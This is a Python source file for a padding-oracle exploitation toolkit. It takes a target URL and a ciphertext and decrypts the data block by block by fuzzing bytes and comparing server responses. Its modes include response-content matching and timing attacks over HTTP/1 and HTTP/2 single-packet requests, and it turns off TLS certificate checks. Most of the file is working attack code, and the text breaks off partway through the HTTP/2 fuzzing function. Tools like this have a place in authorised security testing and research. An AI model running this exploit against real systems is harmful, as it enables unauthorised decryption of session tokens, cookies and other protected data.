import base64
import binascii
import hashlib
import sys
import requests
import time
from h2spacex import H2OnTlsConnection
from time import sleep
import os
from contextlib import contextmanager
import ast
import argparse

name = """     


                  ,pW"Wq.  `7Mb,od8   ,p6"bo     ,6"Yb.  
                 6W'   `Wb   MM' "  '6M'  OO    8)   MM  
                 8M     M8   MM      8M          ,pm9MM  
                 YA.   ,A9   MM      YM.    ,   8M   MM  
                  `Ybmd9'  .JMML.     YMbmd'    `Moo9^Yo.


"""

print(name)

parser = argparse.ArgumentParser(description='A Padding Oracle exploitation toolkit in python.')
parser.add_argument('url',
                    help='Target URL - examples https://example.com:8081/page.aspx, http://example.com, https://127.0.0.1:8080')
parser.add_argument('ciphertext',
                    help='The ciphertext to attack - can be base64 encoded or a string of hex bytes. Provide a URL-decoded version. URL-encoding will be applied on output.')
parser.add_argument('encoding', help='base64 / None')
parser.add_argument('method', help='GET / POST')
parser.add_argument('blocksize', help='8 / 16 / etc')
parser.add_argument('body',
                    help='This is the POST body OR the GET query - it will have all the parameter names and values needed for the request and the ciphertext must match the provided ciphertext.')

parser.add_argument("--headers",
                    help="{'Cookie': 'foo'} Content-Type: application/x-www-form-urlencoded headers are added for POST method.")
parser.add_argument("--keyword", help="A custom keyword to search responses for.")
parser.add_argument("--noiv", help="Activate 'no IV mode'.")
parser.add_argument("--lengthvariation", help="Make response length checking a fuzzy match.")
parser.add_argument("--protocol", help="HTTP1 / HTTP2 (Time-based only)")
parser.add_argument("--repeatruns", help="e.g. 1 / 2 / 4 / 8 (Time-based only, HTTP/1 only)")
parser.add_argument("--delayiftimebased", help="Add a delay to HTTP1 time-based attack. (Time-based only, HTTP/1 only)")
parser.add_argument("--groupsize", help="e.g. 4 / 8 / 16 (Time-based only, HTTP/2 only)")
parser.add_argument("--http2groupsize",
                    help="Number of requests to include in each SPA. (Time-based only, HTTP/2 only)")

args = parser.parse_args()

url = args.url
if len(args.url.split('/')) > 3:
    path = "/" + args.url.split('/')[3]
else:
    path = "/"
ciphertext = args.ciphertext
encoding = args.encoding
method = args.method
block_size = int(args.blocksize)
body = args.body.replace(ciphertext, "[INJECT HERE]")

# we can control the key word searched for using this parameter
# by default it will be padding. the search is case-insensitive.
key_word_to_search_for = 'padding'

# If the ciphertext provided incudes an IV, set this to False
# If the ciphertext provided does not include an IV, set this to True
# In NO IV MODE, we will fuzz from the last one, working back for all blocks:
# NO IV MODE:                                 [BLOCKONE][BLOCKTWO]
# In IV MODE, we will fuzz from the last one, working back for all but the first block - the IV BLOCK is not fuzzed:
# IV MODE:                          [IV BLOCK][BLOCKONE][BLOCKTWO]
# IMPORTANT: in NO IV MODE, you cannot decrypt the last block (e.g. BLOCKONE in the above example).
# This is because although we may brute force BLOCKONE to get the intermediary value, we need to XOR it
# with the prior block (the IV BLOCK) to get the plaintext. We could guess IV values like 00 * 16
# or 31 * 16 etc, etc...
no_iv_mode = False

# This will be used to make the response length checking a fuzzy match.
# The length check will pass if the discovered length is + or - the
# amount shown below. 20 is a good default value. You can also set this
# to 999 to ignore all length request variations - e.g. turn off length
# checking. This is useful if you are getting a good signal from the other
# sources such as status code or found keywords and the lenght is confusing
# the detection engine
response_length_variation = 20

###### HTTP/1 TIME BASED ATTACK DEFAULT SETTINGS ######

### these settings detect delays of 0.02 seconds over HTTP - 20 mS (tested locally)
### these settings detect delays of 0.3 seconds over HTTPS - 300 mS (tested locally)
# delay_if_time_based = 0.1
# number_of_measurement_runs = 20

### these settings detect delays of 0.3 seconds over HTTPS - 300 mS (tested locally)
# delay_if_time_based = 0.01
# number_of_measurement_runs = 6

delay_if_time_based = 0
number_of_measurement_runs = 6

###### HTTP/2 TIME BASED ATTACK DEFAULT SETTINGS ######

# http2_group_size is the only adjustment for http2 mode. for SPA attacks, a small number of requests are sent, but we need to
# send 256 requests, so we need to break this down into smaller "groups" of requests. in my local testing i have
# found that numbers between 4 and 16 work fairly well. the bigger the group size the quicker the scan, but
# the trade-off is that accuracy is reduced.
# http2_group_size must be multiple of 4. must not be smaller than 4 or detection logic will break.
# with a http2_group_size of 4, it was possible to detect delays of 0.009 seconds over HTTP/2 HTTPS - 9 mS (tested locally)
http2_group_size = 8

# This takes the default time based attack values and overrides them if the user has set arguments on the command line
# By default, we use HTTP/1
protocol = "HTTP1"
http2_mode = False
if args.protocol:
    if args.protocol == "HTTP2":
        protocol = "HTTP2"
        http2_mode = True

if args.http2groupsize:
    http2_group_size = int(args.http2groupsize)

if args.repeatruns:
    number_of_measurement_runs = int(args.repeatruns)

if http2_group_size < 4:
    print("[!] Fatal error: HTTP2 group size must be at least 4 or detection logic will break")
    sys.exit()

# Header Setup Section
# Convert the provided headers string into a dictionary:
if args.headers:
    headers = args.headers
    headers = ast.literal_eval(headers)
else:
    # initialize an empty dictionary to store headers in:
    headers = {}

# If the request is a POST, add a 'Content-Type: application/x-www-form-urlencoded' header:
# you could also replace this with a custom header for POST requests:
if method == "POST":
    headers.update({"Content-Type": "application/x-www-form-urlencoded"})

print("[i] URL:              " + url)
print("[i] Path:             " + path)
print("[i] Ciphertext:       " + ciphertext)
print("[i] Encoding:         " + encoding)
print("[i] Method:           " + method)
if method == "POST":
    print("[i] Body:             " + body)
if method == "GET":
    print("[i] Query:            " + body)
print("[i] Headers:          " + str(headers))
if protocol == "HTTP2":
    print("[i] Protocol:         HTTP 2")
    print("[i] Group size:       " + str(http2_group_size))
if protocol == "HTTP1":
    print("[i] Protocol:         HTTP 1")
    if len(sys.argv) > 9:
        print("[i] Number of runs:   " + str(number_of_measurement_runs))

# encrypted_bytes is the hex byte string we will pass to the processing
# e.g. 313233343536373839303132333435362cb8770371460c5a2dc6b6a7e65289b8
# so we will need to decode it if its base64 encoded
# if this is the case, we will also need to b64 encode on output so
# we set the base64encoding_on_output flag if required

base64encoding_on_output = False
encrypted_bytes = ""
if encoding == "base64":
    temp_val = binascii.hexlify(base64.b64decode(ciphertext))
    encrypted_bytes = temp_val.decode()
    base64encoding_on_output = True
else:
    encrypted_bytes = ciphertext

# this is used to silence scapy / h2spacex's output in the console:
@contextmanager
def silence_output():
    with open(os.devnull, "w") as devnull:
        old_stdout = sys.stdout
        sys.stdout = devnull
        try:
            yield
        finally:
            sys.stdout = old_stdout

# suppress https errors
requests.packages.urllib3.disable_warnings()

### Oracle HTTP request handler  ###
def check_for_padding_error(full_encrypted_bytes):
    start_timer = time.perf_counter()

    if method == "POST":
        my_url = scheme + "://" + authority + ":" + str(port) + path
        if base64encoding_on_output:
            b64_encoded_payload = base64.b64encode(binascii.unhexlify(full_encrypted_bytes)).decode()
            encoded_payload = b64_encoded_payload.replace('+', '%2b').replace('=', '%3d')
            my_body_string = body.replace("[INJECT HERE]", encoded_payload)
            res = requests.post(my_url, data=my_body_string, headers=headers, verify=False)
        else:
            res = requests.post(my_url, data=body.replace("[INJECT HERE]", full_encrypted_bytes),
                              headers=headers, verify=False)
    else: # GET pathway:
        if base64encoding_on_output:
            b64_encoded_payload = base64.b64encode(binascii.unhexlify(full_encrypted_bytes)).decode()
            encoded_payload = b64_encoded_payload.replace('+', '%2b').replace('=', '%3d')
            my_query_string = body.replace("[INJECT HERE]", encoded_payload)
            my_url = scheme + "://" + authority + ":" + str(port) + path + "?" + my_query_string
            res = requests.get(my_url, headers=headers, verify=False)
        else:
            my_url = scheme + "://" + authority + ":" + str(port) + path + "?" + body.replace("[INJECT HERE]", full_encrypted_bytes)
            res = requests.get(my_url, headers=headers, verify=False)

    #print("_____DEBUG_____")
    #pretty_print_post(res.request)
    #print("_____DEBUG_____")

    stop_timer = time.perf_counter()
    duration = stop_timer - start_timer
    if key_word_to_search_for in res.text.lower():
        padding_found = "Y"
    else:
        padding_found = "N"
    if 'error' in res.text.lower():
        error_found = "Y"
    else:
        error_found = "N"
    if res.headers.get('location'):
        location = res.headers.get('location')
    else:
        location = "N/A"
    return error_found, padding_found, res.status_code, len(res.content), location, duration


# This does the initial fuzz of just one byte, to measure for differences. A second function
# (full_byte_fuzzer) will do the main fuzz later on. We need some info early on to make decisions about
# how to complete the exploit.
def byte_fuzzer(internal_block_length, internal_ciphertext, internal_delay):
    internal_results_list = []
    counter = 0
    bytes_to_truncate = 2
    length_of_truncated_iv = internal_block_length - bytes_to_truncate
    truncated_iv = "0" * length_of_truncated_iv
    # print('[i] Fuzzing oracle endpoint. Please wait...')
    while counter < 256:
        hex_bytes = "{:02x}".format(counter)
        updated_iv = truncated_iv + hex_bytes
        internal_full_encrypted_bytes = updated_iv + internal_ciphertext
        time.sleep(internal_delay)  # delay before the first request
        internal_results_list.append(hex_bytes + ':' + str(check_for_padding_error(internal_full_encrypted_bytes)))
        counter += 1
        if counter % 16 == 0:
            print("[i] " + str(counter) + "/256", end='\r')
    return internal_results_list


# Takes a list of results from the initial byte fuzz and adds a hash of the results to each item in the list.
# Finally, it returns a new list with the added hashes.
# We are hunting for one response that is different from all the rest, so for each response,  we hash the things
# we care about, like status code, response length, whether the word 'padding' or 'error' was in the response,
# then we can then count the number of unique hashes - if there is only one instance of a given hash, that is
# a strong indicator we have found the byte that matches the padding value '01'.
def analyse(internal_results_list):
    internal_analysis_list = []
    for item in internal_results_list:
        # Note that we need to *not* include the duration in this hash, since we will use that later if needed
        # but not in the initial select - we want to use all the other things like status code, etc, if possible.
        byte_sent = item.split(':')[0]
        buffer = item.split(':')[1].split('(')[1].split(')')[0].split(',')[:-1]
        result = ",".join(buffer)
        # the above should take this:
        # 0a: ('Y', 'N', 500, 30, 'N/A', 0.00393774700000904)
        # and return this:
        # 'Y', 'N', 500, 30, 'N/A'
        # print("byte_sent" + byte_sent)
        # print("result" + result)
        hashed_result = hashlib.md5(result.encode())
        internal_analysis_list.append(byte_sent + ':' + result + ':' + str(hashed_result.hexdigest()))
    return internal_analysis_list


# takes the results of the byte fuzz with added hashes and returns a smaller list
# where items are limited to those with unique hashes also counts the number of each unique hash
def unique_table(internal_analysis_list):
    list_of_unique_hashes = []
    list_of_unique_hashes_with_count = []

    # create a list of unique hashes
    for item in internal_analysis_list:
        result_hash = item.split(':')[2]
        list_of_unique_hashes.append(result_hash)

    # reduce the list of hashes to those that are unique
    list_of_unique_hashes = list(dict.fromkeys(list_of_unique_hashes))

    # we add a 'column' (: seperator) which will store the frequency later on.
    # for now, we add the 'column' and a value of zero
    for item in list_of_unique_hashes:
        list_of_unique_hashes_with_count.append(item + ':0')

    # we now create one final list of unique entries only, where we pull in all
    # the data, and add a frequency (count) value for each unique entry
    for item in internal_analysis_list:
        a = item.split(':')[0]
        b = item.split(':')[1]
        result_hash = item.split(':')[2]
        index = 0  # we need this to know which list entry to modify later
        for row in list_of_unique_hashes_with_count:
            hash_to_check = row.split(':')[0]
            hash_count = row.split(':')[1]
            if result_hash == hash_to_check:
                list_of_unique_hashes_with_count[index] = hash_to_check + ':' + str(
                    int(hash_count) + 1) + ':' + a + ':' + b
            index = index + 1
    return list_of_unique_hashes_with_count


def time_based_analysis(internal_ciphertext, delay_if_time_based):
    joined_results_list = []

    measurement_run_counter = 0
    while measurement_run_counter < number_of_measurement_runs:
        temp_list = []
        print("[i] Running measurement fuzz " + str(measurement_run_counter + 1) + " of " + str(
            number_of_measurement_runs))
        temp_list = byte_fuzzer(block_length, internal_ciphertext, delay_if_time_based)
        for row in temp_list:
            joined_results_list.append(row)
        measurement_run_counter += 1

    results_sets = number_of_measurement_runs

    ## single results sets look like this:
    # cb:('N', 'N', 200, 30, 'N/A', 0.002081321999867214)
    # cc:('N', 'N', 200, 30, 'N/A', 1.0070656659991073)
    # cd:('N', 'N', 200, 30, 'N/A', 0.009136194999882719)
    # ce:('N', 'N', 200, 30, 'N/A', 0.012723997002467513)

    # when we join them, a new result set is concatenated to the end of the
    # previous one

    joined_results_list.sort()
    # for item in joined_results_list:
    #    print(item)
    joined_results_list.sort()
    # after we sort the joined_results_list, the results for a given byte are adjacent:

    # cb:('N', 'N', 200, 30, 'N/A', 0.002053404001344461)
    # cb:('N', 'N', 200, 30, 'N/A', 0.0033702770015224814)
    # cc:('N', 'N', 200, 30, 'N/A', 1.0146074160002172)
    # cc:('N', 'N', 200, 30, 'N/A', 1.0508914460006054)
    # cd:('N', 'N', 200, 30, 'N/A', 0.007387893998384243)
    # cd:('N', 'N', 200, 30, 'N/A', 0.013892262999434024)
    # ce:('N', 'N', 200, 30, 'N/A', 0.006462549998104805)

    line_counter = 0
    number_list = []
    average_values_list = []
    hex_counter = 0
    for item in joined_results_list:
        if line_counter == results_sets:
            line_counter = 0
            # print(number_list)
            average_values_list.append(str(f'{hex_counter:2x}') + ':' + str(sum(number_list)))
            number_list = []
            hex_counter = hex_counter + 1
        number_list.append(float(item.split(' ')[5].strip(')')))
        line_counter = line_counter + 1

    ## now the average_values_list looks like this (here we have joined 2 results sets):
    # cb:0.00412755700017442
    # cc:2.0263466689975758
    # cd:0.015167613000812707

    # now we will walk the list and get the biggest and smallest value
    # note that we get the actual value not the summed value in average_values_list
    # we get the actual value by dividing by the no. measurement runs
    lowest_value = 9999
    greatest_value = 0
    for item in average_values_list:
        time_value = float(item.split(':')[1]) / number_of_measurement_runs
        if time_value < lowest_value:
            lowest_value = time_value
        if time_value > greatest_value:
            greatest_value = time_value

    print("[i] Lowest value:          " + str(lowest_value))
    print("[i] Greatest value:        " + str(greatest_value))

    slowest_hex_val = ''
    fastest_hex_val = ''
    for item in average_values_list:
        time_value = float(item.split(':')[1]) / number_of_measurement_runs
        if time_value == greatest_value:
            slowest_hex_val = item
        if time_value == lowest_value:
            fastest_hex_val = item

    # we can now calculate the difference
    # we divide this in two to get the threshold
    difference_value = greatest_value - lowest_value
    threshold_value = (difference_value / 2) + lowest_value

    print("[i] Difference:            " + str(difference_value))
    print("[i] Threshold:             " + str(threshold_value))

    print("[i] Fastest byte:          " + fastest_hex_val.split(':')[0])
    print("[i] Slowest byte:          " + slowest_hex_val.split(':')[0])

    # what we are looking for is 1 result in one "bucket", and 255 in another "bucket"
    # So: we compare the values in the average_values_list (converting to the actual value)
    # with the threshold value - asking "is this bigger or smaller than the threshold?"
    # once we do that for all 256 values, if one bucket contains only one result, we are able
    # to detect a measurable delay
    greater_count = 0
    smaller_count = 0
    for item in average_values_list:
        time_value = float(item.split(':')[1]) / number_of_measurement_runs
        if time_value >= threshold_value:
            greater_count += 1
        if time_value <= threshold_value:
            smaller_count += 1

    # note that this system can only detect scenarios where the valid padding value triggers
    # a delay that is greater than all other values, OR triggers a delay that is smaller than
    # for all other values. it cannot detect a delay that is in between two extremes.

    print("[i] No. >= than threshold: " + str(greater_count))
    print("[i] No. <= than threshold: " + str(smaller_count))

    i_lower_bound = ""
    i_upper_bound = ""

    if smaller_count == 1:
        print("[i] Smaller signal found")
        i_lower_bound = 0
        i_upper_bound = threshold_value
    else:
        if greater_count == 1:
            print("[i] Greater signal found")
            i_lower_bound = threshold_value
            i_upper_bound = 30

    if len(str(i_upper_bound)) == 0:
        print("[!] Fatal error: no signal found. Try HTTP 2 if supported or try changing delay and number of runs settings.")
        sys.exit()

    return i_upper_bound, i_lower_bound


def user_selection(internal_unique_list):
    ##UNCOMMENT TO TEST FOR TIME BASED##
    #internal_unique_list = []
    #internal_unique_list.append("eb772b7daf6c3b32d26aad120641e5: 255:ff: 'Y', 'N', 500, 30, 'N/A'")
    ##REMOVE ME ##
    count = 1
    print('[i] Initial fuzz complete. ')
    print('[i] Please select an ID that matches a valid decrypt:\n')
    print('-----------------------------------------------------------------')
    print('ID#     Freq     Status  Length  Error Padding Location')
    print('-----------------------------------------------------------------')
    for item in internal_unique_list:
        # print(item)
        line = item.split(':')
        # print(line)
        chunk = line[3].split(',')
        # print(chunk)
        error_found = chunk[0].split("'")[1]
        padding_found = chunk[1].split("'")[1]
        status = chunk[2]
        length = chunk[3]
        location = chunk[4].split("'")[1]
        recommend = "   "
        if line[1] == "1":
            recommend = " **"
        print(str(count) + recommend + '    ' + line[
            1] + '\t' + status + '    ' + length + '\t ' + error_found + '     ' + padding_found + '       ' + location)
        count += 1
    print('-----------------------------------------------------------------')
    if len(internal_unique_list) == 1:
        return None
    internal_selection = input("\n Enter an ID: ")
    if int(internal_selection) < (count + 1):
        if int(internal_selection) > 0:
            print("[i] Continuing test with selection: " + internal_selection)
            return internal_unique_list[int(internal_selection) - 1]
        else:
            user_selection(internal_unique_list)
    else:
        user_selection(internal_unique_list)


def full_byte_fuzzer(internal_block_length, internal_ciphertext, internal_selection, internal_position_to_fuzz,
                     internal_postfix_byte, internal_upper_bound, internal_lower_bound, internal_delay_if_time_based):
    bytes_to_truncate = (internal_block_length - (internal_position_to_fuzz * 2) + 2)
    length_of_truncated_iv = internal_block_length - bytes_to_truncate
    truncated_iv = "0" * length_of_truncated_iv
    # print("truncated_iv ", truncated_iv)
    # print("internal_postfix_byte      ", internal_postfix_byte)
    if not time_based_mode:
        # this is the selection criteria from the user - e.g. 'Y', 'Y', 200, 4748
        target = internal_selection.split(':')[3]
    # print("target      ", str(target))
    counter = 0
    while counter < 256:
        hex_bytes = "{:02x}".format(counter)
        updated_iv = truncated_iv + hex_bytes + internal_postfix_byte
        # print("updated_iv  ", updated_iv)
        full_encrypted_bytes = updated_iv + internal_ciphertext
        if len(full_encrypted_bytes) % 2 != 0:
            print("[!] Fatal error: bytes string must be even length!")
            print("internal_postfix_byte: " + internal_postfix_byte)
            sys.exit()
        if time_based_mode:
            compare_run_counter = 0
            response_time_running_total = 0

            while compare_run_counter < number_of_measurement_runs:
                time.sleep(internal_delay_if_time_based)
                check_result = str(check_for_padding_error(full_encrypted_bytes))
                check_time = float(check_result.split(' ')[5].strip(')'))
                response_time_running_total = response_time_running_total + check_time
                compare_run_counter += 1

            response_time = response_time_running_total / number_of_measurement_runs
            if internal_lower_bound < response_time:
                if internal_upper_bound > response_time:
                    return hex_bytes
                    """
                    # we found a match - perform edge case check (see normal mode for details)
                    if hex_bytes != "ff":
                        special_iv = truncated_iv[:-2] + "ff" + hex_bytes + internal_postfix_byte
                    else:
                        special_iv = truncated_iv[:-2] + "f0" + hex_bytes + internal_postfix_byte
                    # time two responses and get the average:
                    new_encrypted_bytes = special_iv + internal_ciphertext
                    result_0 = check_for_padding_error(new_encrypted_bytes)
                    time.sleep(delay_if_time_based)
                    result_1 = check_for_padding_error(new_encrypted_bytes)
                    response_time_0 = float(check_result_0.split(' ')[5].strip(')'))
                    response_time_1 = float(check_result_1.split(' ')[5].strip(')'))
                    response_time = (response_time_0 + response_time_1) / 2
                    if internal_lower_bound > response_time:
                        return hex_bytes
                    if internal_upper_bound < response_time:
                        return hex_bytes
                    """
        else:
            # Normal mode
            check_result = str(check_for_padding_error(full_encrypted_bytes))
            # if the response criteria match the criteria selected by the user,
            # we found the one request that did not trigger a padding oracle error
            buffer = check_result.split('(')[1].split(')')[0].split(',')[:-1]
            output = ",".join(buffer)
            #print("target      ", str(target))
            #print("output      ", str(output))
            # a fuzzy match is used on response length
            # as a bit of variation here is not unusual
            o_error = output.split(',')[0]
            o_padding = output.split(',')[1]
            o_status = output.split(',')[2]
            o_location = output.split(',')[4]
            o_length = output.split(',')[3]
            t_error = target.split(',')[0]
            t_padding = target.split(',')[1]
            t_status = target.split(',')[2]
            t_location = target.split(',')[4]
            t_length = target.split(',')[3]
            match = False
            if t_error == o_error:
                if t_padding == o_padding:
                    if int(t_status) == int(o_status):
                        if t_location == o_location:
                            if int(t_length) >= (int(o_length) - response_length_variation):
                                if int(t_length) <= (int(o_length) + response_length_variation):
                                    match = True
            if match:
                if position_to_fuzz == 1:  # this can't be done on the last byte
                    return hex_bytes
                else:
                    # print("[i] Potential match found! Running secondary test.")
                    # although a match has been found (say for 01 being the final
                    # byte of the plaintext block) there is a potential problem:
                    # what if we instead matched on the last byte of 0202? or 030303?
                    # we can test for this by seeing if the previous byte matches this one
                    # and if it does, we have found a match.
                    # https://www.nccgroup.com/research/cryptopals-exploiting-cbc-padding-oracles/
                    if hex_bytes != "00":
                        special_iv = truncated_iv[:-2] + "00" + hex_bytes + internal_postfix_byte
                    else:
                        special_iv = truncated_iv[:-2] + "01" + hex_bytes + internal_postfix_byte
                    # print("updated_iv  ", updated_iv)
                    # print("special_iv  ", special_iv)
                    new_encrypted_bytes = special_iv + internal_ciphertext
                    result = str(check_for_padding_error(new_encrypted_bytes))
                    buffer = result.split('(')[1].split(')')[0].split(',')[:-1]
                    output = ",".join(buffer)
                    #print(output)
                    o_error = output.split(',')[0]
                    o_padding = output.split(',')[1]
                    o_status = output.split(',')[2]
                    o_location = output.split(',')[4]
                    o_length = output.split(',')[3]
                    match = False
                    if t_error == o_error:
                        if t_padding == o_padding:
                            if t_status == o_status:
                                if t_location == o_location:
                                    if int(t_length) >= int(o_length) - response_length_variation:
                                        if int(t_length) <= int(o_length) + response_length_variation:
                                            match = True
                    if match:
                        #print("[i] Passed secondary test! Match confirmed!")
                        return hex_bytes
                    #else:
                    #    print("[i] Failed secondary test! Match not confirmed!")
        counter += 1
        if counter % 16 == 0:
            print("[i] " + str(counter) + "/256", end='\r')
    # If we get here, we have failed to find a match for the byte
    return None


# http2 mode timing fuzzer. the http2 workflow is so differently from the other modes, I decided to move
# it outside the full_byte_fuzzer function. For http2, we first generate all the payloads (that's what this function
# does). then we pass those to a second function which takes groups of payloads (4 / 8 / 16 etc) and sends them
# via a single packet attack.
def http2_payload_generator(internal_block_length, internal_ciphertext, internal_selection, internal_position_to_fuzz,
                            internal_postfix_byte, internal_upper_bound, internal_lower_bound,
                            internal_delay_if_time_based):
    bytes_to_truncate = (internal_block_length - (internal_position_to_fuzz * 2) + 2)
    length_of_truncated_iv = internal_block_length - bytes_to_truncate
    truncated_iv = "0" * length_of_truncated_iv
    counter = 0
    payloads_list = []
    while counter < 256:
        hex_bytes = "{:02x}".format(counter)
        updated_iv = truncated_iv + hex_bytes + internal_postfix_byte
        full_encrypted_bytes = updated_iv + internal_ciphertext
        if len(full_encrypted_bytes) % 2 != 0:
            print("[!] Fatal error: bytes string must be even length!")
            print("internal_postfix_byte: " + internal_postfix_byte)
            sys.exit()
        payloads_list.append(hex_bytes + ":" + full_encrypted_bytes)
        counter += 1
    return payloads_list


# receive two variables that are 'hex bytes as strings': e.g. 'f8' and '09'
# XOR them and return a 'hex bytes as string' such as 'd4'
def change_to_be_hex(s):
    return int(s, base=16)


def xor_bytes(str1, str2):
    a = change_to_be_hex(str1)
    b = change_to_be_hex(str2)

    xored_bytes_as_hex = hex(a ^ b)
    # i'm going to hell for this bullshit:
    xored_bytes_as_string = xored_bytes_as_hex[2:]
    # print("str1:                  " + str1)
    # print("str2:                  " + str2)
    # print("xored_bytes_as_string: " + xored_bytes_as_string)
    # bug: if the two input strings were, for example: 0303 and 036d, the output would be 6e instead of 006e
    # also 0f was being returned as f.
    # so, as the strings should always be the same length (both input and output) then I can grab that
    # on input and preserve it on output by appending a suitable number of zeros.

    if len(xored_bytes_as_string) != len(str1):
        zeropad = (len(str1) - len(xored_bytes_as_string)) * '0'
        xored_bytes_as_string = zeropad + xored_bytes_as_string
    return xored_bytes_as_string


# walk two provided hex byte strings and attempt to decrypt each byte in turn
# if a given byte cant be decrypted, return '?' instead for that character.
def bytewise_decrypter(internal_intermediary_value, internal_ciphertext):
    if len(internal_intermediary_value) != len(internal_ciphertext):
        print("[!] Fatal error: bytes strings must be same length")
        print("internal_intermediary_value: " + internal_intermediary_value)
        print("internal_ciphertext:         " + internal_ciphertext)
        sys.exit()
    inter_count = 0
    ptext_buffer = ""
    while inter_count < (len(internal_ciphertext)) / 2:
        ciphertext_byte = internal_ciphertext[inter_count * 2:(inter_count * 2) + 2]
        intermediary_val_byte = internal_intermediary_value[inter_count * 2:(inter_count * 2) + 2]
        # print("ciphertext_byte:       " + ciphertext_byte)
        # print("intermediary_val_byte: " + intermediary_val_byte)
        ptext_bytes = xor_bytes(ciphertext_byte, intermediary_val_byte)
        try:
            ptext_ascii = binascii.unhexlify(ptext_bytes).decode('ascii')
        except:
            ptext_ascii = "?"
        ptext_buffer = ptext_buffer + ptext_ascii
        inter_count += 1
    return ptext_buffer


# helper to chop the encrypted_bytes into a list of blocks based on the provided block_size
def slice_up_encrypted_bytes(internal_encrypted_bytes, internal_block_size):
    # calculate the length in characters of a block
    internal_block_length = internal_block_size * 2
    # ensure that encrypted bytes is a multiple of block size:
    if len(internal_encrypted_bytes) % internal_block_length != 0:
        print("[!] Fatal error: Encrypted bytes must be a multiple of block size.")
        sys.exit()
    else:
        internal_block_list = []
        i2 = 0
        no_blocks_in_encrypted_bytes = len(internal_encrypted_bytes) / internal_block_length
        print("[i] Block size:       " + str(internal_block_size))
        print("[i] Number of blocks: " + str(int(no_blocks_in_encrypted_bytes)))
        while i2 < no_blocks_in_encrypted_bytes:
            internal_block_list.append(internal_encrypted_bytes[(i2 * internal_block_length):(
                                                                                                     i2 * internal_block_length) + internal_block_length])
            i2 += 1
        return internal_block_list, internal_block_length


# analyze provided URL to determine scheme, authority, and port
def parse_host_input(url):
    scheme_detected = url.split(':')[0]
    authority_detected = url.split(':')[1].split('//')[1].split('/')[0].split(':')[0]
    port_detected = 443
    if len(url.split(':')) > 2:
        port_detected = url.split(':')[2].split('/')[0]
    else:
        if scheme_detected == "http":
            port_detected = 80
    return scheme_detected, authority_detected, port_detected


def http2_payload_sender(int_authority, int_port, int_payload_list, int_headers):

    h2_conn = H2OnTlsConnection(
        hostname=int_authority,
        port_number=int_port
    )

    headers_string = ""
    if bool(int_headers):
        for key, value in int_headers.items():
            headers_string = headers_string + f"{key}: {value}" + "\n"
    #print("headers_string: " + headers_string)
    stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=http2_group_size)

    all_headers_frames = []  # all headers frame + data frames which have not the last byte
    all_data_frames = []  # all data frames which contain the last byte

    input_list = []
    counter = 0

    for s_id in stream_ids_list:
        if base64encoding_on_output:
            my_body = body.replace("[INJECT HERE]",
                                   base64.b64encode(binascii.unhexlify(int_payload_list[counter].split(':')[1])).decode(
                                       "utf-8").replace('+', '%2b').replace('=', '%3d'))
        else:
            my_body = body.replace("[INJECT HERE]", int_payload_list[counter].split(':')[1]).replace('+',
                                                                                                     '%2b').replace('=',
                                                                                                                    '%3d')
        if method == "POST":
            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
                method=method,
                headers_string=headers_string,
                scheme=scheme,
                stream_id=s_id,
                authority=authority,
                body=my_body,
                path=path
            )
        else:
            header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_get_request_frames(
                method=method,
                headers_string=headers_string,
                scheme=scheme,
                stream_id=s_id,
                authority=authority,
                body=None,
                path=path + "?" + my_body
            )
        # we store the stream ID and hex_byte submitted here so that when we examine the responses
        # we can identify which hex_byte maps to which stream ID
        # this is important because the order of responses is identified based on the stream id
        # in the example below, if there was no delay, the Stream ID: 33 response would be last response
        # but because Stream ID: 27 caused a delay, it is the last response.
        # Stream ID: 25,  response nano seconds: 1782560741900154967
        # Stream ID: 29,  response nano seconds: 1782560741908146563
        # Stream ID: 31,  response nano seconds: 1782560741915509023
        # Stream ID: 33,  response nano seconds: 1782560741923460941
        # Stream ID: 27,  response nano seconds: 1782560741930697836

        input_list.append(str(s_id) + ':' + str(int_payload_list[counter].split(':')[0]))
        counter += 1

        all_headers_frames.append(header_frames_without_last_byte)
        all_data_frames.append(last_data_frame_with_last_byte)

    # concatenate all headers bytes
    temp_headers_bytes = b''
    for h in all_headers_frames:
        temp_headers_bytes += bytes(h)

    # concatenate all data frames which have last byte
    temp_data_bytes = b''
    for d in all_data_frames:
        temp_data_bytes += bytes(d)
    with silence_output():
        h2_conn.setup_connection()
        h2_conn.send_ping_frame()  # important line (in improved version of single packet attack)

        # send header frames
        h2_conn.send_frames(temp_headers_bytes)

        # wait some time
        sleep(0.1)

        # send ping frame to warm up connection
        h2_conn.send_ping_frame()

        # send remaining data frames
        h2_conn.send_frames(temp_data_bytes)

        h2_conn.start_thread_response_parsing(_timeout=3)
        while not h2_conn.is_threaded_response_finished:
            sleep(1)

        if h2_conn.is_threaded_response_finished is None:
            print('Error has occurred!')
            exit()

        frame_parser = h2_conn.threaded_frame_parser

        h2_conn.close_connection()

    output_list = []

    for x in frame_parser.headers_and_data_frames.keys():
        sid = str(x)
        d = frame_parser.headers_and_data_frames[x]
        # here, we just store the stream ID and the nanoseconds of the response:
        # we want to find the stream ID with the largest nanoseconds
        # then we can map that to a hex_byte
        output_list.append(str(sid) + ':' + str(d["nano_seconds"]))

    return input_list, output_list


def http2_fuzz_manager(block_length, current_block, selection, position_to_fuzz, postfix_byte,
                       upper_bound, lower_bound, delay_if_time_based):

    http2_payload_list = http2_payload_generator(block_length, current_block, selection, position_to_fuzz, postfix_byte,
                                                 upper_bound, lower_bound, delay_if_time_based)

    # we receive a list of 256 payloads like this:
    # a8:000000000000000000000000000000a8e3e8f0c1d881e05ec4f18207217947c4
    # we need to divide these into smaller groups as we cannot submit them in one SPA

    # the hex_bytes used for payload generation start at 00 and increment to ff; however
    # as we are hunting for a value that gets xored with a plaintext, there is a greater chance
    # of a valid value at the top end of the range. so, we reverse the payloads list here:
    http2_payload_list.reverse()

    http2_payload_counter = 0
    internal_counter = 0
    group_counter = 0
    current_http2_payloads = []
    group_results = []
    while http2_payload_counter < 256:
        current_http2_payloads.append(http2_payload_list[http2_payload_counter])
        internal_counter += 1
        http2_payload_counter += 1
        if internal_counter == http2_group_size:
            print("[i] Group " + str(group_counter + 1) + " of " + str(int(256 / http2_group_size)))
            # we have enough payloads to make a group - send them to the http2_payload_sender:

            # for testing purposes this will send a group with a valid payload within it:
            # current_http2_payloads = ['6c:0000000000000000000000000000006ce3e8f0c1d881e05ec4f18207217947c4',
